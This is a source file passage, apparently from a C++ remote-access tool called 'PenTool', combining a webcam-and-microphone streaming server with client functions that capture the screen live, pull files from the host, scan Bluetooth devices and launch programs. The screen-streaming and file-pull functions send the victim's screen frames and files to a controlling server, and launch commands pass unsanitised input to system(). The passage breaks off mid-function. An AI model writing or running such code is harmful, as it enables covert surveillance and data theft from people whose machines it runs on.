const SERVER_SR = 16000; // server sample rate
let ws;
let sampleRate = SERVER_SR, channels = 1;
let audioCtx = null, gainNode = null;
let ptsOffset = 0.0, ptsOffsetSet = false;
let frames = 0;
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');

function createWS() {
    const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
    ws = new WebSocket(proto + '//' + location.host + '/ws');
    ws.binaryType = 'arraybuffer';
    ws.onopen = () => { 
        document.getElementById('status').textContent='Connected'; 
        // Reconnect audio context if needed
        if (audioCtx && audioCtx.state === 'suspended') {
            audioCtx.resume();
        }
    };
    ws.onclose = () => { 
        document.getElementById('status').textContent='Disconnected'; 
        setTimeout(createWS, 1200); 
    };
    ws.onmessage = onMessage;
}
function sendCmd(obj) {
    if (ws && ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify(obj));
}

// audio initialization
function initAudio() {
    if (audioCtx) return;
    audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: sampleRate });
    gainNode = audioCtx.createGain();
    gainNode.gain.value = 0.3;
    gainNode.connect(audioCtx.destination);
}

// parse uint64 little-endian
function parseUint64(dv, offset) {
    const low = dv.getUint32(offset, true);
    const high = dv.getUint32(offset+4, true);
    return low + high * 4294967296;
}

// ---------- Robust audio helpers ----------

// Helper: detect little-endian host
function isLittleEndian() {
    const buf = new ArrayBuffer(2);
    new DataView(buf).setUint16(0, 0x1234, true);
    return new Uint8Array(buf)[0] === 0x34;
}
const HOST_LITTLE_ENDIAN = isLittleEndian();

// Robust conversion from ArrayBuffer (starting at offset) -> Int16Array
function int16ArrayFromBuffer(ab, offset = 0) {
    const byteLen = ab.byteLength - offset;
    const samples = Math.floor(byteLen / 2);
    if (samples <= 0) return new Int16Array(0);

    try {
        if (HOST_LITTLE_ENDIAN) {
            // direct view without copy
            return new Int16Array(ab, offset, samples);
        }
    } catch (e) {
        // fallthrough to safe path if direct view fails
    }
    // fallback: read per-sample with DataView (little-endian)
    const dv = new DataView(ab, offset);
    const out = new Int16Array(samples);
    for (let i = 0; i < samples; i++) out[i] = dv.getInt16(i * 2, true);
    return out;
}

// Safer resampler: linear interpolation with careful handling of tiny buffers
function resampleInt16ToFloat32(int16arr, fromRate, toRate) {
    const srcLen = int16arr.length;
    if (srcLen === 0) return new Float32Array(0);
    if (fromRate === toRate) {
        const out = new Float32Array(srcLen);
        for (let i = 0; i < srcLen; i++) out[i] = Math.max(-1, Math.min(1, int16arr[i] / 32768));
        return out;
    }

    const duration = srcLen / fromRate;
    const outLen = Math.max(1, Math.round(duration * toRate));
    const out = new Float32Array(outLen);
    if (outLen === 1) {
        out[0] = Math.max(-1, Math.min(1, int16arr[0] / 32768));
        return out;
    }

    const ratio = (srcLen - 1) / (outLen - 1);
    for (let i = 0; i < outLen; i++) {
        const pos = i * ratio;
        const i0 = Math.floor(pos);
        const i1 = Math.min(i0 + 1, srcLen - 1);
        const frac = pos - i0;
        const s0 = int16arr[i0] / 32768;
        const s1 = int16arr[i1] / 32768;
        out[i] = s0 + (s1 - s0) * frac;
    }
    return out;
}

// Small moving-average FIR low-pass; window 3 gives gentle smoothing without ringing
function movingAverageLowpass(floatIn, windowSize = 3) {
    const n = floatIn.length;
    if (n === 0) return new Float32Array(0);
    const out = new Float32Array(n);
    const w = Math.max(1, Math.min(9, windowSize | 0));
    let sum = 0.0;
    for (let i = 0; i < n; i++) {
        sum += floatIn[i];
        if (i - w >= 0) sum -= floatIn[i - w];
        const curWindow = Math.min(w, i + 1);
        out[i] = sum / curWindow;
    }
    return out;
}

// Smoothed ptsOffset adjustment to avoid sudden jumps - increased buffer for external connections
function updatePtsOffset(measuredLocal, packetPtsSec, targetBufferSec = 0.12) {
    const desired = measuredLocal - packetPtsSec + targetBufferSec;
    if (!ptsOffsetSet) {
        ptsOffset = desired;
        ptsOffsetSet = true;
    } else {
        ptsOffset = ptsOffset * 0.92 + desired * 0.08;
    }
}

// Schedule audio safely with better error handling
function scheduleFloatAudio(floatBuf, playAtSec) {
    if (!audioCtx) initAudio();
    if (floatBuf.length === 0) return;
    const buffer = audioCtx.createBuffer(1, floatBuf.length, audioCtx.sampleRate);
    buffer.getChannelData(0).set(floatBuf);
    const src = audioCtx.createBufferSource();
    src.buffer = buffer;
    src.connect(gainNode);
    const now = audioCtx.currentTime;
    const safeStart = Math.max(now + 0.005, playAtSec);
    try {
        src.start(safeStart);
    } catch (e) {
        console.log("Audio scheduling error:", e);
        audioCtx.resume().then(()=> {
            try { 
                src.start(Math.max(audioCtx.currentTime + 0.005, playAtSec)); 
            } catch(e2) {
                console.log("Audio scheduling retry failed:", e2);
            }
        });
    }
    const aheadMs = Math.max(0, (safeStart - audioCtx.currentTime) * 1000);
    document.getElementById('abuf').textContent = aheadMs.toFixed(0) + "ms";
}

// ---------- End robust audio helpers ----------

function onMessage(ev) {
    if (typeof ev.data === 'string') {
        try {
            const obj = JSON.parse(ev.data);
            if (obj.type === 'init') {
                sampleRate = obj.sampleRate || sampleRate;
                channels = obj.channels || channels;
                initAudio();
            }
        } catch(e){}
        return;
    }
    // binary
    const ab = ev.data;
    const dv = new DataView(ab);
    const tag = dv.getUint8(0);
    const ptsMs = parseUint64(dv, 1);

    if (!audioCtx) initAudio();
    if (!ptsOffsetSet) {
        const localNow = audioCtx.currentTime;
        updatePtsOffset(localNow, ptsMs / 1000.0, 0.12);
    }

    if (tag === 1) {
        const blob = new Blob([ab.slice(9)], { type: 'image/jpeg' });
        createImageBitmap(blob).then(bitmap => {
            ctx.clearRect(0,0,canvas.width,canvas.height);
            ctx.drawImage(bitmap, 0, 0, canvas.width, canvas.height);
            bitmap.close();
            frames++;
            document.getElementById('frames').textContent = frames;
        }).catch(()=>{});
    } else if (tag === 2) {
        const int16arr = int16ArrayFromBuffer(ab, 9);
        const floatResampled = resampleInt16ToFloat32(int16arr, SERVER_SR, audioCtx.sampleRate);
        const floatSmoothed = movingAverageLowpass(floatResampled, 3);
        const playAt = (ptsMs / 1000.0) + ptsOffset;
        scheduleFloatAudio(floatSmoothed, playAt);
    }
}

// UI controls: Start/Stop, Volume, Distance
document.getElementById('startBtn').addEventListener('click', ()=>{
    if (ws && ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify({command:'start_stream'}));
});
document.getElementById('stopBtn').addEventListener('click', ()=>{
    if (ws && ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify({command:'stop_stream'}));
});
document.getElementById('toggleAudio').addEventListener('click', (e) => {
    if (!audioCtx) initAudio();
    if (audioCtx.state === 'running') { 
        audioCtx.suspend(); 
        e.target.textContent='Audio OFF'; 
    } else { 
        audioCtx.resume(); 
        e.target.textContent='Audio ON'; 
    }
});
document.getElementById('vol').addEventListener('input', (e) => {
    if (!gainNode) initAudio();
    gainNode.gain.value = e.target.value/100;
});

// Distance slider: sends meters to server -> server maps to mic_gain
const distSlider = document.getElementById('distance');
const distLabel = document.getElementById('distLabel');
distSlider.addEventListener('input', (e) => {
    const meters = Number(e.target.value);
    distLabel.textContent = meters + " m";
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({command:'set_mic_distance','meters': meters}));
    }
});

// Handle page visibility changes to manage audio context
document.addEventListener('visibilitychange', () => {
    if (audioCtx) {
        if (document.hidden) {
            audioCtx.suspend();
        } else {
            audioCtx.resume();
        }
    }
});

window.onload = createWS;
</script>
</body>
</html>
)HTML";

    con->set_body(html);
    con->append_header("Content-Type", "text/html");
}

// Webcam streamer main function
void streamer_main() {
    std::cout << "Webcam streamer starting on port 9002...\n";
    std::cout << "Open a web browser and navigate to:\n";
    std::cout << "  http://localhost:9002 (local access)\n";
    printLocalIPs();
    std::cout << "Press Enter to stop the streamer...\n";
    
    try {
        streamer_ws_server.init_asio();
        streamer_ws_server.set_reuse_addr(true);
        streamer_ws_server.set_open_handler(&on_open);
        streamer_ws_server.set_close_handler(&on_close);
        streamer_ws_server.set_message_handler(&on_message);
        streamer_ws_server.set_http_handler(&on_http);
        
        // Bind to all interfaces
        streamer_ws_server.listen(9002);
        streamer_ws_server.start_accept();
        
        // Run the server in a separate thread
        std::thread server_thread([&]() {
            try {
                streamer_ws_server.run();
            } catch (const std::exception& e) {
                std::cerr << "Server exception: " << e.what() << std::endl;
            }
        });
        server_thread.detach();
        
        // Wait for user to press Enter to stop
        std::cin.get();
        
        // Stop the server
        streamer_ws_server.stop();
        
        // Clean up resources
        if (is_streaming) {
            is_streaming = false;
            msleep(50);
            if (global_pa_stream) {
                Pa_StopStream(global_pa_stream);
                Pa_CloseStream(global_pa_stream);
                Pa_Terminate();
                global_pa_stream = nullptr;
            }
            {
                std::lock_guard<std::mutex> lk(latest_frame_mutex);
                latest_frame.release();
                have_frame = false;
            }
            {
                std::lock_guard<std::mutex> lk(audio_mutex);
                audio_queue.clear();
            }
            if (camera.isOpened()) camera.release();
        }
    } catch (const std::exception& e) {
        std::cerr << "Exception: " << e.what() << std::endl;
    } catch (websocketpp::lib::error_code ec) {
        std::cerr << "Ws error: " << ec.message() << std::endl;
    }
}

// =============================
// End WebStreamer Code
// =============================

class PenTool {
public:
    std::vector<Command> commands;
    std::mutex log_mutex;
    std::thread geoloc_thread;
    std::atomic<bool> geoloc_active{false};
    std::atomic<bool> stop_geoloc{false};
    static std::atomic<bool> running; // Static declaration

    // Add to PenTool class private section
    std::atomic<bool> live_screen_running{false};
    std::thread live_screen_thread;

    // Bluetooth devices
    std::vector<BluetoothDevice> discovered_devices;
    std::vector<std::string> command_history;

    // Platform-specific sleep function
    void platform_sleep(int milliseconds) {
        #ifdef _WIN32
            Sleep(milliseconds);
        #else
            usleep(milliseconds * 1000);
        #endif
    }

    // Signal handler
    static void signal_handler(int s) {
        std::cout << "\nReceived interrupt signal, shutting down...\n";
        PenTool::running = false;
        exit(0);
    }

    // Base64 encoding function
    std::string base64_encode(const std::vector<unsigned char>& data) {
        static const std::string base64_chars = 
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            "abcdefghijklmnopqrstuvwxyz"
            "0123456789+/";
        
        std::string ret;
        int i = 0;
        int j = 0;
        unsigned char char_array_3[3];
        unsigned char char_array_4[4];
        size_t in_len = data.size();
        const unsigned char* bytes_to_encode = data.data();
        
        while (in_len--) {
            char_array_3[i++] = *(bytes_to_encode++);
            if (i == 3) {
                char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
                char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
                char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
                char_array_4[3] = char_array_3[2] & 0x3f;
                
                for(i = 0; i < 4; i++)
                    ret += base64_chars[char_array_4[i]];
                i = 0;
            }
        }
        
        if (i) {
            for(j = i; j < 3; j++)
                char_array_3[j] = '\0';
            
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;
            
            for (j = 0; j < i + 1; j++)
                ret += base64_chars[char_array_4[j]];
            
            while(i++ < 3)
                ret += '=';
        }
        
        return ret;
    }

    // Add this helper function to PenTool class
    bool send_all(socket_t sock, const char* buffer, size_t length) {
        size_t total_sent = 0;
        while (total_sent < length) {
            int sent = send(sock, buffer + total_sent, length - total_sent, 0);
            if (sent <= 0) {
                #ifdef _WIN32
                    int error = WSAGetLastError();
                    if (error == WSAEWOULDBLOCK) {
                        std::this_thread::sleep_for(std::chrono::milliseconds(10));
                        continue;
                    }
                #else
                    if (errno == EWOULDBLOCK || errno == EAGAIN) {
                        std::this_thread::sleep_for(std::chrono::milliseconds(10));
                        continue;
                    }
                #endif
                return false;
            }
            total_sent += sent;
        }
        return true;
    }

    // Cross-platform Bluetooth scanning function
    void scan_bluetooth_devices() {
        discovered_devices.clear();
        
        #ifdef _WIN32
            // Windows Bluetooth scanning
            BLUETOOTH_DEVICE_SEARCH_PARAMS search_params = {0};
            BLUETOOTH_DEVICE_INFO device_info = {0};
            HBLUETOOTH_DEVICE_FIND found_dev;

            search_params.dwSize = sizeof(search_params);
            search_params.fReturnAuthenticated = TRUE;
            search_params.fReturnRemembered = TRUE;
            search_params.fReturnUnknown = TRUE;
            search_params.fReturnConnected = TRUE;
            search_params.fIssueInquiry = TRUE;

            device_info.dwSize = sizeof(device_info);

            found_dev = BluetoothFindFirstDevice(&search_params, &device_info);
            if (found_dev) {
                do {
                    BluetoothDevice device;
                    // Convert wide char to string for device name
                    std::wstring wname(device_info.szName);
                    device.name = std::string(wname.begin(), wname.end());
                    
                    // Convert Bluetooth address to string
                    char addr[18] = {0};
                    sprintf(addr, "%02X:%02X:%02X:%02X:%02X:%02X",
                            device_info.Address.rgBytes[5],
                            device_info.Address.rgBytes[4],
                            device_info.Address.rgBytes[3],
                            device_info.Address.rgBytes[2],
                            device_info.Address.rgBytes[1],
                            device_info.Address.rgBytes[0]);
                    device.address = addr;
                    
                    device.connected = device_info.fConnected;
                    device.remembered = device_info.fRemembered;
                    device.authenticated = device_info.fAuthenticated;
                    
                    discovered_devices.push_back(device);
                } while (BluetoothFindNextDevice(found_dev, &device_info));
                BluetoothFindDeviceClose(found_dev);
            }
        #else
            // Linux Bluetooth scanning (BlueZ)
            int dev_id = hci_get_route(nullptr);
            int sock = hci_open_dev(dev_id);
            if (dev_id < 0 || sock < 0) {
                perror("opening socket");
                return;
            }

            int len = 8; // Inquiry duration (1.28 * len seconds)
            int max_rsp = 255;
            int flags = IREQ_CACHE_FLUSH;

            inquiry_info *ii = nullptr;
            int num_rsp = hci_inquiry(dev_id, len, max_rsp, nullptr, &ii, flags);
            if (num_rsp < 0) {
                perror("hci_inquiry");
                close(sock);
                return;
            }

            char addr[19] = {0};
            char name[248] = {0};

            for (int i = 0; i < num_rsp; i++) {
                ba2str(&(ii[i].bdaddr), addr);
                memset(name, 0, sizeof(name));
                
                BluetoothDevice device;
                device.address = addr;
                
                if (hci_read_remote_name(sock, &(ii[i].bdaddr), sizeof(name), name, 0) < 0) {
                    device.name = "[unknown]";
                } else {
                    device.name = name;
                }
                
                device.connected = false; // Not available from this scan
                device.remembered = false; // Not available from this scan
                device.authenticated = false; // Not available from this scan
                
                discovered_devices.push_back(device);
            }

            free(ii);
            close(sock);
        #endif
    }

    // Platform-specific volume control functions
    #ifdef _WIN32
        bool win_set_volume(float level) {
            CoInitialize(NULL);
            IMMDeviceEnumerator *deviceEnumerator = NULL;
            IMMDevice *defaultDevice = NULL;
            IAudioEndpointVolume *endpointVolume = NULL;
            HRESULT hr;

            hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_INPROC_SERVER, 
                                __uuidof(IMMDeviceEnumerator), (LPVOID *)&deviceEnumerator);
            if (FAILED(hr)) return false;

            hr = deviceEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &defaultDevice);
            if (FAILED(hr)) {
                deviceEnumerator->Release();
                return false;
            }

            hr = defaultDevice->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_INPROC_SERVER, NULL, (LPVOID *)&endpointVolume);
            if (FAILED(hr)) {
                defaultDevice->Release();
                deviceEnumerator->Release();
                return false;
            }

            hr = endpointVolume->SetMasterVolumeLevelScalar(level, NULL);
            
            endpointVolume->Release();
            defaultDevice->Release();
            deviceEnumerator->Release();
            CoUninitialize();
            
            return SUCCEEDED(hr);
        }

        float win_get_volume() {
            CoInitialize(NULL);
            IMMDeviceEnumerator *deviceEnumerator = NULL;
            IMMDevice *defaultDevice = NULL;
            IAudioEndpointVolume *endpointVolume = NULL;
            float level = 0.0f;
            HRESULT hr;

            hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_INPROC_SERVER, 
                                __uuidof(IMMDeviceEnumerator), (LPVOID *)&deviceEnumerator);
            if (FAILED(hr)) return 0.0f;

            hr = deviceEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &defaultDevice);
            if (FAILED(hr)) {
                deviceEnumerator->Release();
                return 0.0f;
            }

            hr = defaultDevice->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_INPROC_SERVER, NULL, (LPVOID *)&endpointVolume);
            if (FAILED(hr)) {
                defaultDevice->Release();
                deviceEnumerator->Release();
                return 0.0f;
            }

            hr = endpointVolume->GetMasterVolumeLevelScalar(&level);
            
            endpointVolume->Release();
            defaultDevice->Release();
            deviceEnumerator->Release();
            CoUninitialize();
            
            return SUCCEEDED(hr) ? level : 0.0f;
        }

        bool win_set_brightness(int level) {
            // Use WMI to set brightness on Windows
            std::string cmd = "wmic namespace\\\\root\\wmi path WmiMonitorBrightnessMethods where Active=true call WmiSetBrightness brightness=" + std::to_string(level);
            int result = system(cmd.c_str());
            return result == 0;
        }

        int win_get_brightness() {
            // Use WMI to get brightness on Windows
            std::string cmd = "wmic namespace\\\\root\\wmi path WmiMonitorBrightness get CurrentBrightness /value";
            FILE* pipe = _popen(cmd.c_str(), "r");
            if (!pipe) return 0;

            char buffer[128];
            std::string result = "";
            while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
                result += buffer;
            }
            _pclose(pipe);

            // Parse the result to get the brightness value
            size_t pos = result.find("CurrentBrightness=");
            if (pos != std::string::npos) {
                std::string value = result.substr(pos + 18);
                value = value.substr(0, value.find('\r'));
                try {
                    return std::stoi(value);
                } catch (...) {
                    return 0;
                }
            }
            return 0;
        }
    #else
        bool linux_set_volume(float level) {
            std::string cmd = "amixer set Master " + std::to_string(static_cast<int>(level * 100)) + "%";
            return system(cmd.c_str()) == 0;
        }

        float linux_get_volume() {
            FILE* pipe = popen("amixer get Master | grep -o '[0-9]*%' | head -1", "r");
            if (!pipe) return 0.0f;
            
            char buffer[128];
            if (fgets(buffer, sizeof(buffer), pipe)) {
                pclose(pipe);
                std::string result(buffer);
                size_t percent_pos = result.find('%');
                if (percent_pos != std::string::npos) {
                    try {
                        int level = std::stoi(result.substr(0, percent_pos));
                        return level / 100.0f;
                    } catch (...) {
                        return 0.0f;
                    }
                }
            }
            pclose(pipe);
            return 0.0f;
        }

        bool linux_set_brightness(int level) {
            std::vector<std::string> paths = {
                "/sys/class/backlight/intel_backlight/brightness",
                "/sys/class/backlight/acpi_video0/brightness",
                "/sys/class/backlight/radeon_bl0/brightness"
            };

            for (const auto& path : paths) {
                std::ifstream test_file(path);
                if (test_file.good()) {
                    std::ofstream file(path);
                    if (file.is_open()) {
                        file << level;
                        file.close();
                        return true;
                    }
                }
            }

            std::string cmd = "xrandr --output $(xrandr | grep ' connected' | head -n1 | cut -d' ' -f1) --brightness " + 
                            std::to_string(level / 100.0f);
            return system(cmd.c_str()) == 0;
        }

        int linux_get_brightness() {
            std::vector<std::string> paths = {
                "/sys/class/backlight/intel_backlight/brightness",
                "/sys/class/backlight/acpi_video0/brightness",
                "/sys/class/backlight/radeon_bl0/brightness"
            };

            for (const auto& path : paths) {
                std::ifstream file(path);
                if (file.is_open()) {
                    int current;
                    file >> current;
                    
                    std::string max_path = path.substr(0, path.find_last_of('/')) + "/max_brightness";
                    std::ifstream max_file(max_path);
                    if (max_file.is_open()) {
                        int max;
                        max_file >> max;
                        return static_cast<int>((current * 100.0f) / max);
                    }
                    return current;
                }
            }
            return 100;
        }
    #endif

    // Handle volume commands
    void handle_volume(const std::vector<std::string>& args) {
        if (args.empty()) {
            #ifdef _WIN32
                float current = win_get_volume();
            #else
                float current = linux_get_volume();
            #endif
            std::cout << "Current volume: " << static_cast<int>(current * 100) << "%\n";
            return;
        }

        std::string operation = args[0];
        if (operation[0] == '+' || operation[0] == '-') {
            try {
                int change = std::stoi(operation);
                #ifdef _WIN32
                    float current = win_get_volume();
                    float new_level = std::max(0.0f, std::min(1.0f, current + (change / 100.0f)));
                    if (win_set_volume(new_level)) {
                        std::cout << "Volume set to: " << static_cast<int>(new_level * 100) << "%\n";
                    }
                #else
                    float current = linux_get_volume();
                    float new_level = std::max(0.0f, std::min(1.0f, current + (change / 100.0f)));
                    if (linux_set_volume(new_level)) {
                        std::cout << "Volume set to: " << static_cast<int>(new_level * 100) << "%\n";
                    }
                #endif
            } catch (...) {
                std::cout << "Invalid volume change value\n";
            }
        } else {
            try {
                int level = std::stoi(operation);
                float normalized = std::max(0.0f, std::min(100.0f, static_cast<float>(level))) / 100.0f;
                #ifdef _WIN32
                    if (win_set_volume(normalized)) {
                        std::cout << "Volume set to: " << level << "%\n";
                    }
                #else
                    if (linux_set_volume(normalized)) {
                        std::cout << "Volume set to: " << level << "%\n";
                    }
                #endif
            } catch (...) {
                std::cout << "Invalid volume level\n";
            }
        }
    }

    // Handle brightness commands
    void handle_brightness(const std::vector<std::string>& args) {
        if (args.empty()) {
            #ifdef _WIN32
                int current = win_get_brightness();
            #else
                int current = linux_get_brightness();
            #endif
            std::cout << "Current brightness: " << current << "%\n";
            return;
        }

        std::string operation = args[0];
        if (operation[0] == '+' || operation[0] == '-') {
            try {
                int change = std::stoi(operation);
                #ifdef _WIN32
                    int current = win_get_brightness();
                    int new_level = std::max(0, std::min(100, current + change));
                    if (win_set_brightness(new_level)) {
                        std::cout << "Brightness set to: " << new_level << "%\n";
                    }
                #else
                    int current = linux_get_brightness();
                    int new_level = std::max(0, std::min(100, current + change));
                    if (linux_set_brightness(new_level)) {
                        std::cout << "Brightness set to: " << new_level << "%\n";
                    }
                #endif
            } catch (...) {
                std::cout << "Invalid brightness change value\n";
            }
        } else {
            try {
                int level = std::stoi(operation);
                level = std::max(0, std::min(100, level));
                #ifdef _WIN32
                    if (win_set_brightness(level)) {
                        std::cout << "Brightness set to: " << level << "%\n";
                    }
                #else
                    if (linux_set_brightness(level)) {
                        std::cout << "Brightness set to: " << level << "%\n";
                    }
                #endif
            } catch (...) {
                std::cout << "Invalid brightness level\n";
            }
        }
    }

    // Handle open URL commands
    void handle_open_url(const std::vector<std::string>& args) {
        if (args.empty()) {
            std::cout << "Usage: open <url>\n";
            return;
        }

        std::string url = args[0];
        if (url.find("://") == std::string::npos) {
            url = "http://" + url;
        }

        #ifdef _WIN32
            ShellExecute(NULL, "open", url.c_str(), NULL, NULL, SW_SHOWNORMAL);
        #else
            std::string command = "xdg-open \"" + url + "\"";
            system(command.c_str());
        #endif

        std::cout << "Opening: " << url << "\n";
    }

    // Add this function to PenTool class
    void handle_live_screen(const std::vector<std::string>& args) {
        std::cout << "\n[Live Screen]\n";
        
        if (live_screen_running) {
            // Stop live screen
            live_screen_running = false;
            if (live_screen_thread.joinable()) {
                live_screen_thread.join();
            }
            std::cout << "Live screen streaming stopped.\n";
            log_action("Live screen streaming stopped");
            
            // Send stop notification
            send_to_server("[LIVE_SCREEN_STOP]\n");
            return;
        }
        
        std::cout << "Starting live screen streaming...\n";
        std::cout << "Press Ctrl+C to stop streaming\n";
        
        live_screen_running = true;
        
        // Start live screen thread
        live_screen_thread = std::thread([this]() {
            try {
                // Send start notification
                send_to_server("[LIVE_SCREEN_START]\n");
                
                // Screen capture loop
                while (live_screen_running) {
                    cv::Mat frame = capture_screen();
                    if (frame.empty()) {
                        std::this_thread::sleep_for(std::chrono::milliseconds(30));
                        continue;
                    }
                    
                    // Convert to BGR format if needed (same as screenshot)
                    if (frame.channels() == 4) {
                        cv::Mat bgr_frame;
                        bgr_frame = safe_opencv::convertBGRAtoBGR(frame);
                        frame = bgr_frame;
                    }
                    
                    // Encode frame as JPEG with higher quality (same as screenshot)
                    std::vector<uchar> buffer;
                    std::vector<int> params = {cv::IMWRITE_JPEG_QUALITY, 90};  // Higher quality
                    cv::imencode(".jpg", frame, buffer, params);
                    
                    // Send frame data
                    std::string header = "[LIVE_SCREEN:" + std::to_string(buffer.size()) + "]";
                    send_to_server(header);
                    send_binary_data(reinterpret_cast<const char*>(buffer.data()), buffer.size());
                    
                    // Control frame rate (approximately 15 fps)
                    std::this_thread::sleep_for(std::chrono::milliseconds(66));
                }
            } catch (const std::exception& e) {
                std::cerr << "Live screen error: " << e.what() << std::endl;
            }
            
            // Send stop notification
            send_to_server("[LIVE_SCREEN_STOP]\n");
        });
        
        // Don't detach the thread - we need to join it when stopping
        // live_screen_thread.detach();  // REMOVED THIS LINE
        
        log_action("Live screen streaming started");
    }

    // Add this new function to handle explicit stop command
    void handle_stop_live_screen(const std::vector<std::string>& args) {
        if (live_screen_running) {
            live_screen_running = false;
            if (live_screen_thread.joinable()) {
                live_screen_thread.join();
            }
            std::cout << "Live screen streaming stopped.\n";
            log_action("Live screen streaming stopped");
            
            // Send stop notification
            send_to_server("[LIVE_SCREEN_STOP]\n");
        }
    }

    // Add this screen capture function to PenTool class
    cv::Mat capture_screen() {
        cv::Mat frame;
        
    #ifdef _WIN32
        // Windows implementation
        HDC hdcScreen = GetDC(NULL);
        HDC hdcMem = CreateCompatibleDC(hdcScreen);
        int screenWidth = GetDeviceCaps(hdcScreen, HORZRES);
        int screenHeight = GetDeviceCaps(hdcScreen, VERTRES);
        
        HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
        SelectObject(hdcMem, hBitmap);
        
        BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);
        
        BITMAPINFOHEADER bi = {0};
        bi.biSize = sizeof(BITMAPINFOHEADER);
        bi.biWidth = screenWidth;
        bi.biHeight = -screenHeight;  // Negative for top-down DIB
        bi.biPlanes = 1;
        bi.biBitCount = 32;
        bi.biCompression = BI_RGB;
        
        frame.create(screenHeight, screenWidth, CV_8UC4);
        GetDIBits(hdcMem, hBitmap, 0, screenHeight, frame.data, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
        
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
    #else
        // Linux implementation
        Display* display = XOpenDisplay(nullptr);
        if (!display) {
            std::cerr << "Failed to open X display" << std::endl;
            return frame;
        }
        
        Window root = DefaultRootWindow(display);
        int width = DisplayWidth(display, DefaultScreen(display));
        int height = DisplayHeight(display, DefaultScreen(display));
        
        XImage* img = XGetImage(display, root, 0, 0, width, height, AllPlanes, ZPixmap);
        if (!img) {
            XCloseDisplay(display);
            return frame;
        }
        
        // Create cv::Mat and copy data from XImage
        // First create a temporary Mat that references the XImage data
        cv::Mat temp(height, width, CV_8UC4, img->data, img->bytes_per_line);
        // Then clone to get a copy that we own
        frame = temp.clone();
        
        XDestroyImage(img);
        XCloseDisplay(display);
    #endif
        
        return frame;
    }

    // Handle register app commands
    void handle_register_app(const std::vector<std::string>& args) {
        if (args.empty()) {
            std::cout << "Usage: register <app_name_or_path>\n";
            return;
        }

        std::string app = args[0];
        
        #ifdef _WIN32
            if (app == "google-chrome" || app == "chrome") {
                system("start chrome");
            } else if (app == "firefox") {
                system("start firefox");
            } else if (app == "edge") {
                system("start msedge");
            } else {
                system(("start " + app).c_str());
            }
        #else
            if (app == "google-chrome" || app == "chrome") {
                system("google-chrome &");
            } else if (app == "firefox") {
                system("firefox &");
            } else {
                system((app + " &").c_str());
            }
        #endif

        std::cout << "Launching: " << app << "\n";
    }

    // Handle Bluetooth commands
    void handle_bluetooth(const std::vector<std::string>& args) {
        if (args.empty()) {
            std::cout << "Usage: bluetooth <scan>\n";
            return;
        }

        std::string action = args[0];

        if (action == "scan") {
            std::cout << "Scanning for Bluetooth devices...\n";
            scan_bluetooth_devices();
            std::cout << "Scan completed. Found " << discovered_devices.size() << " devices.\n";
            
            // Display discovered devices
            for (size_t i = 0; i < discovered_devices.size(); ++i) {
                const auto& device = discovered_devices[i];
                std::cout << "[" << i << "] " << device.name 
                         << " (" << device.address << ")";
                #ifdef _WIN32
                    std::cout << " [" << (device.connected ? "Connected" : "Disconnected") << "]";
                    std::cout << " [" << (device.remembered ? "Remembered" : "Not Remembered") << "]";
                    std::cout << " [" << (device.authenticated ? "Authenticated" : "Not Authenticated") << "]";
                #endif
                std::cout << "\n";
            }
        } else {
            std::cout << "Unknown Bluetooth action: " << action << "\n";
        }
    }

    void handle_pull(const std::vector<std::string>& args) {
        if (args.empty()) {
            std::cout << "Usage: pull <file or folder path>\n";
            return;
        }

        std::string source_path = args[0];
        if (source_path[0] != '/' && (source_path[0] != '\\' && source_path[1] != ':')) {
            source_path = current_dir + PATH_SEP + source_path;
        }

        if (!fs::exists(source_path)) {
            std::cout << "Error: Path does not exist: " << source_path << "\n";
            return;
        }

        std::string dest_path = current_dir + PATH_SEP + fs::path(source_path).filename().string();

        if (fs::is_regular_file(source_path)) {
            uintmax_t file_size = fs::file_size(source_path);
            if (file_size > 100 * 1024 * 1024) {
                std::cout << "This file is " << (file_size / (1024 * 1024)) << " MB. Waiting for server confirmation...\n";
                
                std::string msg = "[PULL_CONFIRM:" + source_path + ":" + std::to_string(file_size) + "]\n";
                send_to_server(msg);
                
                std::cout << "Waiting for server response...\n";
                return;
            }

            std::cout << "Sending file: " << source_path << " to server\n";

            // Open file in binary mode
            std::ifstream src(source_path, std::ios::binary);
            if (!src) {
                std::cout << "Error: Could not open source file.\n";
                return;
            }

            // Get file size
            src.seekg(0, std::ios::end);
            uintmax_t total_size = src.tellg();
            src.seekg(0, std::ios::beg);

            // Create header with binary-safe format
            std::string filename = fs::path(source_path).filename().string();
            std::string header = "[PULL_FILE:" + filename + ":" + std::to_string(total_size) + "]";
            
            // Send header
            if (!send_all(current_socket, header.c_str(), header.size())) {
                std::cerr << "Failed to send pull file header\n";
                src.close();
                return;
            }

            // Send file content in binary mode
            const size_t buffer_size = 8192; // Increased buffer size for efficiency
            std::vector<char> buffer(buffer_size);
            uintmax_t copied = 0;
            int progress = 0;

